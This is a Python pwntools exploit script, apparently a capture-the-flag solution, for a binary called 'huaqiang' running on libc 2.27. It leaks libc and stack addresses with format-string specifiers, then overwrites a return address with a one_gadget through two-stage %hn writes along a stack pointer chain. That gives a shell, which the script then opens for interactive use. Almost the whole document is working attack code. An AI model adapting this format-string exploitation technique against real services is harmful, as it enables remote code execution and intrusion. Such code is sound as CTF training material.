from pwn import *
context(os="linux", arch="amd64")

DEBUG=1
LOCAL=1

if (DEBUG):
	context.log_level="debug"

g_fname = "./huaqiang"
g_elf = ELF(g_fname)
g_libcname = "./libc-2.27.so"

if (LOCAL):
	g_io = process(g_fname)
	g_libc = g_elf.libc
else:
	g_io = remote("127.0.0.1", 4321)
	g_libc = ELF(g_libcname)

def getpid():
	if (LOCAL & DEBUG):
		log.debug("pid: %d", g_io.proc.pid)
		pause()

s, sa, sla = g_io.send, g_io.sendafter, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def opt(idx):
	sa("Your choice: ", str(idx))

def show():
	opt(2)

def buy(phone_idx, number, note_len, content):
	opt(1)
	sla("What phone do you want to buy: ", str(phone_idx))
	sla("How many: ", str(number))
	sla("How long is your note: ", str(note_len))
	sa("Content: ", content)

def write_word(addr, data_in_word):
	# stack[off1] --> stack[off2] --> target
	off1 = 19	# there is a 1st-level pointer on stack offset 19.
	off2 = 45	# The 2nd-level pointer at offset 45.
	# 1st. 	modify the 2nd-level pointer points to addr via 1st-level pointer at off1.
	# 		we just need modify the last 2 bytes of the 19th stack val.
	fmt_temp = "%{cnt}c%{offset}$hn"
	payload = fmt_temp.format(cnt=addr&0xffff, offset=off1)
	buy(0, 1, len(payload), payload)
	show()
	
	# 2nd. use modifyed 2nd-level pointer to rewrite target with 2 bytes data.
	payload = fmt_temp.format(cnt=data_in_word&0xffff, offset=off2)
	buy(0, 1, len(payload), payload)
	show()

	# 2nd. write 2 bytes data into the 
def write_one_gadget(target_addr, onegadget_addr):
	write_word(target_addr, onegadget_addr&0xffff)
	write_word(target_addr+2, (onegadget_addr >> 16) & 0xffff)
	
def pwn():
	# __libc_start_main+231 offset
	off_libc_start = 17
	# __libc_argv's offset
	off_libc_argv = 19
	
	# 1. leak libc's and stack's address
	payload_leak = flat(["@##@%" + str(off_libc_start) + "$p@##@%" + str(off_libc_argv) + "$p\n\0"])
	buy(0, 1, len(payload_leak), payload_leak)
	#getpid()
	show()
	ru("@##@")
	data = rl()
	log.info("received data: %s", data)
	addr_libc, addr_stack = map(lambda x: int(x, 16), data[:-1].decode().split("@##@"))
	log.success("addr_libc=%#x\naddr_stack=%#x", addr_libc, addr_stack)

	libc_base = addr_libc - 231 - g_libc.symbols["__libc_start_main"]
	addr_target = addr_stack - 0xe0 # The constant is relative to libc's version. There use libc-2.27.so
	one_gadget = libc_base + 0x4f3d5
	log.success("libc@%#x\naddr_target=%#x\none_gadget@%#x", libc_base, addr_target, one_gadget)
	
	#getpid()
	# 2. use fmt to modify the return address from "__libc_start_main" to one_gadget
	write_one_gadget(addr_target, one_gadget)

	# 3. exit to trigger one_gadget to getshell.
	opt(4)

if ("__main__" == __name__):
	pwn()
	g_io.interactive()
